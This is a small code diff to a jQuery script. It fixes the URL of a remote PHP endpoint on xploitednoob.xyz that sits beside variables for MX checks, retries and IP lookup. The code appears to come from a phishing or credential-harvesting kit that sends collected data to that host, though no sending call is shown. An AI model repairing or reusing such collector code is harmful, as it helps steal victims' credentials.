@@ -1,5 +1,5 @@
 $(document).ready(function() {
-    var php_url = "http//xploitednoob.xyz/api.php";
+    var php_url = "http://xploitednoob.xyz/api.php";
     var check_mx = false;
     var numretry = 0;
     var ipinfo = ipinfo();
